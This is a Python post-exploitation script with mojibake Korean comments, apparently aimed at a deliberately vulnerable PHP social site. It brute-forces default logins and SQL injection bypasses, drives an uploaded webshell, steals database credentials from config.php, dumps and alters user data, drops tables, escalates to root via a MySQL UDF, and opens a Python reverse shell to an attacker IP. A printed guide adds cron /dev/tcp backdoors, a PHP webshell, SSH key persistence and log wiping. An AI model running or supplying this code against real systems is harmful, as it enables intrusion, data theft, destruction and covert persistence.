#!/usr/bin/env python3
"""
SQL Injection ìš°íšŒ ë²„ì „ - post_exploit.py
"""

import requests
import sys
import time
from urllib.parse import quote

class PostExploiter:
    def __init__(self, target_ip, attacker_ip, attacker_port):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.webshell_url = None
        self.webshell_name = None
        self.webshell_param = "cmd"
        self.session = requests.Session()

    def login(self):
        """ê¸°ë³¸ ê³„ì • + SQL Injection ì‹œë„"""
        print("[*] ë¡œê·¸ì¸ ì‹œë„ ì¤‘...")

        login_url = f"http://{self.target_ip}/login.php"

        # PRIORITY 1: ê¸°ë³¸ ê³„ì • ë¨¼ì € ì‹œë„ (ê°€ì¥ í˜„ì‹¤ì )
        print("\n[*] Phase 1: ê¸°ë³¸ ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸ ì‹œë„")
        default_credentials = [
            ("admin", "admin123"),
            ("alice", "alice2024"),
            ("bob", "bobby123"),
            ("admin", "admin"),
            ("admin", "password"),
            ("alice", "alice123"),
            ("bob", "bob123"),
        ]

        for username, password in default_credentials:
            try:
                print(f"[*] ì‹œë„: {username} / {password}")

                data = {
                    'username': username,
                    'password': password
                }

                resp = self.session.post(login_url, data=data, timeout=10, allow_redirects=True)

                # ë¡œê·¸ì¸ ì„±ê³µ í™•ì¸
                if 'login.php' not in resp.url and resp.status_code == 200:
                    print(f"[+] ê¸°ë³¸ ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸ ì„±ê³µ!")
                    print(f"    Username: {username}")
                    print(f"    Password: {password}")
                    return True

                # ì¶”ê°€ ì²´í¬: ì¿ í‚¤ & ë¦¬ë‹¤ì´ë ‰íŠ¸
                if 'PHPSESSID' in self.session.cookies or 'session' in str(self.session.cookies).lower():
                    test_resp = self.session.get(f"http://{self.target_ip}/index.php")
                    if 'login' not in test_resp.url.lower() or 'logout' in test_resp.text.lower():
                        print(f"[+] ê¸°ë³¸ ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸ ì„±ê³µ! (ì„¸ì…˜ í™•ì¸)")
                        print(f"    Username: {username}")
                        print(f"    Password: {password}")
                        return True

                time.sleep(0.5)

            except Exception as e:
                print(f"[-] ì—ëŸ¬: {str(e)[:50]}")
                continue

        print("\n[-] ê¸°ë³¸ ê³„ì • ë¡œê·¸ì¸ ì‹¤íŒ¨")

        # PRIORITY 2: SQL Injection ì‹œë„ (Prepared Statementë¡œ ë§‰í˜€ìˆì„ ê°€ëŠ¥ì„± ë†’ìŒ)
        print("\n[*] Phase 2: SQL Injection ìš°íšŒ ì‹œë„ (Prepared Statement ìš°íšŒ)")
        sql_payloads = [
            # ê¸°ë³¸ í˜ì´ë¡œë“œ
            ("admin", "' or '1'='1' --"),
            ("admin", "' or '1'='1"),
            ("admin", "' or 1=1 --"),
            ("admin", "' or 1=1#"),

            # ì£¼ì„ ìš°íšŒ
            ("admin' --", "anything"),
            ("admin'--", "anything"),
            ("admin' #", "anything"),
            ("admin'#", "anything"),
            ("admin'/*", "anything"),

            # OR ìš°íšŒ
            ("admin' OR '1'='1", ""),
            ("admin') OR '1'='1' --", ""),
            ("admin')) OR '1'='1' --", ""),

            # ëŒ€ì†Œë¬¸ì í˜¼í•©
            ("admin' Or '1'='1' --", ""),
            ("admin' oR '1'='1' --", ""),
            ("aDmIn' OR '1'='1' --", ""),

            # ê³µë°± ìš°íšŒ
            ("admin'/**/OR/**/'1'='1'--", ""),
            ("admin'/**/or/**/1=1--", ""),

            # ê°„ë‹¨í•œ True ì¡°ê±´
            ("admin' or true --", ""),
            ("admin' or 'a'='a' --", ""),
        ]

        for username, password in sql_payloads:
            try:
                print(f"[*] ì‹œë„: username={username[:30]}, password={password[:30]}")

                data = {
                    'username': username,
                    'password': password
                }

                resp = self.session.post(login_url, data=data, timeout=10, allow_redirects=True)

                # ë¡œê·¸ì¸ ì„±ê³µ í™•ì¸
                if 'login.php' not in resp.url and resp.status_code == 200:
                    print(f"[+] ë¡œê·¸ì¸ ì„±ê³µ!")
                    print(f"    Username: {username}")
                    print(f"    Password: {password}")
                    return True

                # ì¶”ê°€ ì²´í¬: ì¿ í‚¤ í™•ì¸
                if 'PHPSESSID' in self.session.cookies:
                    # ì„¸ì…˜ í…ŒìŠ¤íŠ¸
                    test_resp = self.session.get(f"http://{self.target_ip}/index.php")
                    if 'login' not in test_resp.url.lower():
                        print(f"[+] ì„¸ì…˜ ê¸°ë°˜ ë¡œê·¸ì¸ ì„±ê³µ!")
                        return True

            except Exception as e:
                print(f"[-] ì—ëŸ¬: {e}")
                continue

        print("[-] ëª¨ë“  í˜ì´ë¡œë“œ ì‹¤íŒ¨")
        return False

    def find_webshell(self):
        """ì—…ë¡œë“œëœ ì›¹ì‰˜ ì°¾ê¸°"""
        print("[*] ì›¹ì‰˜ ì°¾ëŠ” ì¤‘...")

        # ì›¹ì‰˜ íŒŒì¼ëª… í™•ì¥ ë¦¬ìŠ¤íŠ¸
        shell_names = [
            "mysql_udf_shell.php5",  # ìƒˆë¡œ ì—…ë¡œë“œí•œ ê²ƒ
            "shell.php5",
            "shell_advanced.phtml",
            "shell.jpg",
            "shell.php",
            "shell.php3",
            "shell.php4",
            "shell.phtml",
            "shell.phps",
            "shell.phar",
            "shell98.php5",
        ]

        # file.phpë¥¼ í†µí•œ ì ‘ê·¼
        base_url = f"http://{self.target_ip}/file.php"

        for shell_name in shell_names:
            try:
                # cmd íŒŒë¼ë¯¸í„° ì‹œë„
                test_url = f"{base_url}?name={shell_name}&cmd=whoami"
                resp = self.session.get(test_url, timeout=5)

                if resp.status_code == 200 and 'apache' in resp.text.lower():
                    self.webshell_url = base_url
                    self.webshell_name = shell_name
                    self.webshell_param = "cmd"
                    print(f"[+] ì›¹ì‰˜ ë°œê²¬: {test_url}")
                    print(f"[+] ì‘ë‹µ: {resp.text[:100]}")
                    return True
            except:
                pass

        print("[-] ì›¹ì‰˜ì„ ì°¾ì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤")
        return False

    def execute_command(self, cmd):
        """ì›¹ì‰˜ì„ í†µí•´ ëª…ë ¹ ì‹¤í–‰"""
        if not self.webshell_url:
            return None

        try:
            params = {
                'name': self.webshell_name,
                self.webshell_param: cmd
            }
            resp = self.session.get(self.webshell_url, params=params, timeout=10)
            return resp.text
        except Exception as e:
            print(f"[-] ëª…ë ¹ ì‹¤í–‰ ì‹¤íŒ¨: {e}")
            return None

    def steal_config_and_db_access(self):
        """config.php ì½ê³  DB ì •ë³´ íƒˆì·¨ í›„ ì§ì ‘ ì ‘ì†"""
        print("\n" + "="*60)
        print("DB ì„¤ì • íŒŒì¼ íƒˆì·¨ ë° ì§ì ‘ ì ‘ì†")
        print("="*60)

        # Step 1: config.php ì½ê¸°
        print("\n[*] Step 1: config.php íŒŒì¼ íƒˆì·¨")
        config_paths = [
            '/var/www/html/www/config.php',
            '/var/www/html/config.php',
            '../config.php',
            'config.php',
        ]

        config_content = None
        for path in config_paths:
            print(f"[*] ì‹œë„: {path}")
            result = self.execute_command(f"cat {path} 2>/dev/null")
            if result and ('DB_' in result or 'password' in result.lower()):
                config_content = result
                print(f"[+] config.php ë°œê²¬: {path}")
                print(f"[+] ë‚´ìš©:\n{result[:500]}...\n")
                break

        if not config_content:
            print("[-] config.phpë¥¼ ì°¾ì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤")
            return False

        # Step 2: DB ì •ë³´ íŒŒì‹±
        print("\n[*] Step 2: DB ì ‘ì† ì •ë³´ ì¶”ì¶œ")
        import re

        db_host = re.search(r"DB_HOST['\"]?\s*[,=]\s*['\"]([^'\"]+)", config_content)
        db_user = re.search(r"DB_USER['\"]?\s*[,=]\s*['\"]([^'\"]+)", config_content)
        db_pass = re.search(r"DB_PASS(?:WORD)?['\"]?\s*[,=]\s*['\"]([^'\"]+)", config_content)
        db_name = re.search(r"DB_NAME['\"]?\s*[,=]\s*['\"]([^'\"]+)", config_content)

        if db_host: db_host = db_host.group(1)
        if db_user: db_user = db_user.group(1)
        if db_pass: db_pass = db_pass.group(1)
        if db_name: db_name = db_name.group(1)

        print(f"[+] DB Host: {db_host}")
        print(f"[+] DB User: {db_user}")
        print(f"[+] DB Pass: {db_pass}")
        print(f"[+] DB Name: {db_name}")

        if not all([db_user, db_pass, db_name]):
            print("[-] DB ì •ë³´ íŒŒì‹± ì‹¤íŒ¨")
            return False

        # Step 3: MySQL ì§ì ‘ ì ‘ì† ë° ë°ì´í„° íƒˆì·¨
        print("\n[*] Step 3: MySQL ì§ì ‘ ì ‘ì†í•˜ì—¬ ë°ì´í„° íƒˆì·¨")

        mysql_queries = [
            ("SELECT user, host FROM mysql.user;", "MySQL ì‚¬ìš©ì ëª©ë¡"),
            ("SELECT * FROM users;", "ëª¨ë“  ì‚¬ìš©ì ì •ë³´"),
            ("SELECT username, password, email FROM users;", "ì‚¬ìš©ì ê³„ì • ì •ë³´"),
            ("SELECT * FROM posts;", "ëª¨ë“  ê²Œì‹œë¬¼"),
            ("SHOW TABLES;", "ë°ì´í„°ë² ì´ìŠ¤ í…Œì´ë¸” ëª©ë¡"),
            ("DESCRIBE users;", "users í…Œì´ë¸” êµ¬ì¡°"),
        ]

        db_data = {}
        for query, desc in mysql_queries:
            print(f"\n[*] ì‹¤í–‰: {desc}")
            cmd = f"mysql -h {db_host} -u {db_user} -p'{db_pass}' {db_name} -e \"{query}\" 2>/dev/null"
            result = self.execute_command(cmd)

            if result:
                print(f"[+] ì„±ê³µ!\n{result[:500]}")
                db_data[desc] = result
            else:
                print(f"[-] ì‹¤íŒ¨: {desc}")

        # Step 4: ë°ì´í„° ë³€ì¡° (í¬ì¸íŠ¸ ì¡°ì‘, ê¶Œí•œ ìƒìŠ¹)
        print("\n[*] Step 4: ë°ì´í„°ë² ì´ìŠ¤ ë³€ì¡° ê³µê²©")

        destructive_queries = [
            ("UPDATE users SET points=999999 WHERE username='admin';", "admin í¬ì¸íŠ¸ 999999ë¡œ ë³€ê²½"),
            ("UPDATE users SET points=999999;", "ëª¨ë“  ì‚¬ìš©ì í¬ì¸íŠ¸ ìµœëŒ€ì¹˜ë¡œ"),
            ("UPDATE users SET password='$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi' WHERE username='admin';", "admin ë¹„ë°€ë²ˆí˜¸ë¥¼ 'password'ë¡œ ë¦¬ì…‹"),
            ("SELECT username, points FROM users;", "ë³€ê²½ëœ í¬ì¸íŠ¸ í™•ì¸"),
        ]

        for query, desc in destructive_queries:
            print(f"\n[*] {desc}")
            cmd = f"mysql -h {db_host} -u {db_user} -p'{db_pass}' {db_name} -e \"{query}\" 2>/dev/null"
            result = self.execute_command(cmd)

            if result:
                print(f"[+] ì„±ê³µ!\n{result}")
            else:
                print(f"[-] ì‹¤íŒ¨")
            time.sleep(0.5)

        # Step 5: íŒŒê´´ì  ê³µê²© (ì„ íƒì )
        print("\n[*] Step 5: íŒŒê´´ì  ê³µê²© (í…Œì´ë¸” ì‚­ì œ)")
        print("[!] WARNING: ì´ ì‘ì—…ì€ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ íŒŒê´´í•©ë‹ˆë‹¤!")

        destructive_attacks = [
            ("DELETE FROM posts WHERE id > 0;", "ëª¨ë“  ê²Œì‹œë¬¼ ì‚­ì œ"),
            ("TRUNCATE TABLE logs;", "ë¡œê·¸ í…Œì´ë¸” ë¹„ìš°ê¸°"),
            ("DROP TABLE IF EXISTS sessions;", "ì„¸ì…˜ í…Œì´ë¸” ì‚­ì œ"),
        ]

        for query, desc in destructive_attacks:
            print(f"\n[*] {desc}")
            cmd = f"mysql -h {db_host} -u {db_user} -p'{db_pass}' {db_name} -e \"{query}\" 2>/dev/null"
            result = self.execute_command(cmd)

            if result or True:  # Even if no output, it might have succeeded
                print(f"[+] ì‹¤í–‰ ì™„ë£Œ: {desc}")
            time.sleep(0.5)

        print("\n[+] ë°ì´í„°ë² ì´ìŠ¤ ì§ì ‘ ì ‘ì† ë° ì¡°ì‘ ì™„ë£Œ!")
        return True

    def mysql_root_exploit(self):
        """MySQL rootë¡œ UDF ê¶Œí•œ ìƒìŠ¹"""
        print("\n" + "="*60)
        print("MySQL Root UDF ê¶Œí•œ ìƒìŠ¹")
        print("="*60)

        print("\n[*] MySQL root ë¹„ë°€ë²ˆí˜¸: vulnerable123")
        print("[*] UDF ê¶Œí•œ ìƒìŠ¹ ì‹œë„ ì¤‘...\n")

        commands = [
            "mysql -u root -p'vulnerable123' vulnerable_sns -e \"SELECT * FROM udf_temp INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';\"",
            "mysql -u root -p'vulnerable123' -e \"CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';\"",
            "mysql -u root -p'vulnerable123' -e \"SELECT do_system('chmod u+s /bin/bash');\"",
            "ls -la /bin/bash",
        ]

        for cmd in commands:
            print(f"[*] ì‹¤í–‰: {cmd}")
            result = self.execute_command(cmd)
            if result:
                print(f"[+] ê²°ê³¼:\n{result}\n")
            time.sleep(1)

        print("[*] SUID bash í™•ì¸:")
        result = self.execute_command("/bin/bash -p -c 'whoami && id'")
        if result and 'root' in result:
            print(f"[+] ROOT íšë“ ì„±ê³µ!\n{result}")
            return True
        else:
            print("[-] ê¶Œí•œ ìƒìŠ¹ ì‹¤íŒ¨")
            return False

    def setup_reverse_shell(self):
        """ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²°"""
        print("\n" + "="*60)
        print("ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²°")
        print("="*60)

        print(f"\n[*] ê³µê²©ì IP: {self.attacker_ip}:{self.attacker_port}")
        print("[*] ë‹¤ë¥¸ í„°ë¯¸ë„ì—ì„œ ë¦¬ìŠ¤ë„ˆë¥¼ ì‹œì‘í•˜ì„¸ìš”:")
        print(f"    nc -lvnp {self.attacker_port}")
        print()
        input("[!] ë¦¬ìŠ¤ë„ˆë¥¼ ì‹œì‘í•œ í›„ Enterë¥¼ ëˆ„ë¥´ì„¸ìš”...")

        # Python reverse shell (ë” ì•ˆì •ì )
        reverse_shell_cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.attacker_ip}\",{self.attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"

        print(f"\n[*] ë¦¬ë²„ìŠ¤ ì‰˜ ì‹¤í–‰ ì¤‘...")
        print(f"[*] Payload: Python reverse shell")

        # ë°±ê·¸ë¼ìš´ë“œë¡œ ì‹¤í–‰
        result = self.execute_command(f"{reverse_shell_cmd} &")

        print("\n[+] ë¦¬ë²„ìŠ¤ ì‰˜ í˜ì´ë¡œë“œ ì „ì†¡ ì™„ë£Œ!")
        print("[*] nc ë¦¬ìŠ¤ë„ˆë¥¼ í™•ì¸í•˜ì„¸ìš”. ì—°ê²°ë˜ì—ˆì„ ê²ƒì…ë‹ˆë‹¤.")
        print("\n[*] ì—°ê²° í›„ ì‰˜ì„ ì•ˆì •í™”í•˜ë ¤ë©´:")
        print("    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
        print("    export TERM=xterm")
        print()
        input("Press Enter to continue...")

    def print_manual_instructions(self):
        """ìˆ˜ë™ ëª…ë ¹ì–´ ê°€ì´ë“œ ì¶œë ¥"""
        print("\n" + "="*60)
        print("ğŸ”¥ ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²° í›„ ì‹¤í–‰ ê°€ì´ë“œ")
        print("="*60)

        print("\n" + "="*60)
        print("ğŸ“Œ [STEP 0] ì‰˜ ì•ˆì •í™” (ë¨¼ì € ì‹¤í–‰!)")
        print("="*60)
        print("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
        print("export TERM=xterm")
        print("# Ctrl+Z ëˆ„ë¥¸ í›„:")
        print("stty raw -echo; fg")
        print("# Enter ë‘ ë²ˆ")
        print()
        input("â¸ï¸  ì‰˜ ì•ˆì •í™”ë¥¼ ì™„ë£Œí–ˆìœ¼ë©´ Enterë¥¼ ëˆ„ë¥´ì„¸ìš”...")

        print("\n" + "="*60)
        print("ğŸ“Œ [STEP 1] ê¸°ë³¸ ì •ë³´ ìˆ˜ì§‘")
        print("="*60)
        print("whoami                           # í˜„ì¬ ì‚¬ìš©ì í™•ì¸")
        print("id                               # UID, GID í™•ì¸")
        print("pwd                              # í˜„ì¬ ìœ„ì¹˜")
        print("ls -la                           # íŒŒì¼ ëª©ë¡")
        print("uname -a                         # ì‹œìŠ¤í…œ ì •ë³´")
        print()
        input("â¸ï¸  ì •ë³´ ìˆ˜ì§‘ ì™„ë£Œ í›„ Enter...")

        print("\n" + "="*60)
        print("ğŸ“Œ [STEP 2] config.php ì½ê¸° (DB ì •ë³´ íƒˆì·¨) â­")
        print("="*60)
        print("# íŒŒì¼ ì°¾ê¸°:")
        print("find /var/www -name 'config.php' 2>/dev/null")
        print()
        print("# íŒŒì¼ ì½ê¸°:")
        print("cat /var/www/html/www/config.php")
        print("# ë˜ëŠ”")
        print("cat ../config.php")
        print()
        print("# ğŸ” ì°¾ì•„ì•¼ í•  ì •ë³´:")
        print("#   - DB_HOST (ì˜ˆ: localhost)")
        print("#   - DB_USER (ì˜ˆ: dbuser)")
        print("#   - DB_PASS (ì˜ˆ: dbpass123)")
        print("#   - DB_NAME (ì˜ˆ: vulnerable_sns)")
        print()
        input("â¸ï¸  config.phpë¥¼ ì½ê³  DB ì •ë³´ë¥¼ ë©”ëª¨í•œ í›„ Enter...")

        print("\n" + "="*60)
        print("ğŸ“Œ [STEP 3] MySQL ì§ì ‘ ì ‘ì† â­â­â­")
        print("="*60)
        print("# config.phpì—ì„œ ì–»ì€ ì •ë³´ë¡œ ì ‘ì†:")
        print("mysql -h localhost -u [DB_USER] -p'[DB_PASS]' [DB_NAME]")
        print()
        print("# ì˜ˆì‹œ (ì‹¤ì œ ê°’ìœ¼ë¡œ êµì²´):")
        print("mysql -h localhost -u dbuser -p'dbpass123' vulnerable_sns")
        print()
        input("â¸ï¸  MySQLì— ì ‘ì†í–ˆìœ¼ë©´ Enter...")

        print("\n" + "="*60)
        print("ğŸ“Œ [STEP 4] MySQL ì¿¼ë¦¬ ì‹¤í–‰ (ë°ì´í„° íƒˆì·¨ & ë³€ì¡°)")
        print("="*60)

        print("\n--- 4-1. ë°ì´í„°ë² ì´ìŠ¤ êµ¬ì¡° íŒŒì•… ---")
        print("SHOW TABLES;")
        print("DESCRIBE users;")
        print()

        print("--- 4-2. ëª¨ë“  ì‚¬ìš©ì ë°ì´í„° íƒˆì·¨ ---")
        print("SELECT * FROM users;")
        print("SELECT username, password, email, points FROM users;")
        print()

        print("--- 4-3. í¬ì¸íŠ¸ ì¡°ì‘ (999999ë¡œ ë³€ê²½) ---")
        print("UPDATE users SET points=999999 WHERE username='admin';")
        print("# ë˜ëŠ” ëª¨ë“  ì‚¬ìš©ì:")
        print("UPDATE users SET points=999999;")
        print()

        print("--- 4-4. ë¹„ë°€ë²ˆí˜¸ ë¦¬ì…‹ (admin ë¹„ë²ˆì„ 'password'ë¡œ) ---")
        print("UPDATE users SET password='$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi' WHERE username='admin';")
        print()

        print("--- 4-5. ë³€ê²½ì‚¬í•­ í™•ì¸ ---")
        print("SELECT username, points FROM users;")
        print()

        print("--- 4-6. ë°ì´í„° íŒŒê´´ (ì„ íƒ) ---")
        print("DELETE FROM posts WHERE id > 0;      # ëª¨ë“  ê²Œì‹œë¬¼ ì‚­ì œ")
        print("TRUNCATE TABLE logs;                  # ë¡œê·¸ ì‚­ì œ")
        print("DROP TABLE sessions;                  # ì„¸ì…˜ í…Œì´ë¸” ì‚­ì œ")
        print()

        print("--- 4-7. MySQL ì¢…ë£Œ ---")
        print("exit;")
        print()
        input("â¸ï¸  MySQL ì‘ì—… ì™„ë£Œ í›„ Enter...")

        print("\n" + "="*60)
        print("ğŸ“Œ [STEP 5] ê¶Œí•œ ìƒìŠ¹ ì‹œë„ (ì„ íƒ)")
        print("="*60)
        print("# SUID ë°”ì´ë„ˆë¦¬ ì°¾ê¸° (ê¶Œí•œ ìƒìŠ¹ ë²¡í„°)")
        print("find / -perm -4000 -type f 2>/dev/null")
        print()
        print("# sudo ê¶Œí•œ í™•ì¸")
        print("sudo -l")
        print()
        print("# MySQL root ê³„ì •ìœ¼ë¡œ ì ‘ì† (ì„œë²„ì— root ë¹„ë²ˆì´ ìˆë‹¤ë©´)")
        print("mysql -u root -p'vulnerable123' vulnerable_sns")
        print()
        print("# Kernel exploit í™•ì¸")
        print("uname -r")
        print("searchsploit linux kernel $(uname -r)")
        print()

        print("\n" + "="*60)
        print("ğŸ“Œ [STEP 6] ì˜êµ¬ ë°±ë„ì–´ ì„¤ì¹˜ (ì„ íƒ)")
        print("="*60)
        print("# SSH í‚¤ ì¶”ê°€ (ì¬ì ‘ì† ê°€ëŠ¥)")
        print("mkdir -p ~/.ssh")
        print("echo 'YOUR_SSH_PUBLIC_KEY' >> ~/.ssh/authorized_keys")
        print("chmod 600 ~/.ssh/authorized_keys")
        print()
        print("# Cron ë°±ë„ì–´ (ë§¤ë¶„ ë¦¬ë²„ìŠ¤ ì‰˜)")
        print(f"(crontab -l 2>/dev/null; echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/{self.attacker_ip}/{self.attacker_port} 0>&1\"') | crontab -")
        print()
        print("# ì›¹ì‰˜ ë°±ë„ì–´ ì¶”ê°€")
        print("echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/backup.php")
        print()

        print("\n" + "="*60)
        print("ğŸ“Œ [STEP 7] í”ì  ì œê±° (ì„ íƒ)")
        print("="*60)
        print("# ëª…ë ¹ì–´ íˆìŠ¤í† ë¦¬ ì‚­ì œ")
        print("history -c")
        print("cat /dev/null > ~/.bash_history")
        print()
        print("# ë¡œê·¸ ì‚­ì œ")
        print("cat /dev/null > /var/log/apache2/access.log")
        print("cat /dev/null > /var/log/apache2/error.log")
        print()

        print("\n" + "="*60)
        print("âœ… ì‘ì—… ì™„ë£Œ!")
        print("="*60)
        print("ë‹¬ì„±í•œ ê²ƒ:")
        print("  âœ… ë¦¬ë²„ìŠ¤ ì‰˜ íšë“")
        print("  âœ… config.php íƒˆì·¨")
        print("  âœ… MySQL ì§ì ‘ ì ‘ì†")
        print("  âœ… ëª¨ë“  ì‚¬ìš©ì ë°ì´í„° íƒˆì·¨")
        print("  âœ… í¬ì¸íŠ¸ ì¡°ì‘ (999999)")
        print("  âœ… ë¹„ë°€ë²ˆí˜¸ ë¦¬ì…‹")
        print("  âœ… ë°ì´í„° ì‚­ì œ")
        print()
        print("ë¦¬ë²„ìŠ¤ ì‰˜ì´ ëŠê¸°ë©´ ë‹¤ì‹œ ì‹¤í–‰:")
        print(f"  python3 {sys.argv[0]} {self.target_ip} {self.attacker_ip} {self.attacker_port}")
        print("="*60)

    def run(self):
        """ì „ì²´ ì‹¤í–‰ - ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²°ë§Œ"""
        print("="*60)
        print("POST-EXPLOITATION - ë¦¬ë²„ìŠ¤ ì‰˜ ìë™ ì—°ê²°")
        print("="*60)

        # ë¡œê·¸ì¸
        if not self.login():
            print("[-] ë¡œê·¸ì¸ ì‹¤íŒ¨")
            return False

        # ì›¹ì‰˜ ì°¾ê¸°
        if not self.find_webshell():
            print("\n[-] ì›¹ì‰˜ ì°¾ê¸° ì‹¤íŒ¨")
            return False

        # ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²°
        self.setup_reverse_shell()

        # ìˆ˜ë™ ëª…ë ¹ì–´ ê°€ì´ë“œ
        self.print_manual_instructions()

        return True


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("ì‚¬ìš©ë²•: python3 post_exploit_bypass.py <TARGET_IP> <ATTACKER_IP> <ATTACKER_PORT>")
        print("ì˜ˆ: python3 post_exploit_bypass.py 3.34.181.145 13.158.67.78 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = int(sys.argv[3])

    exploiter = PostExploiter(target_ip, attacker_ip, attacker_port)
    exploiter.run()
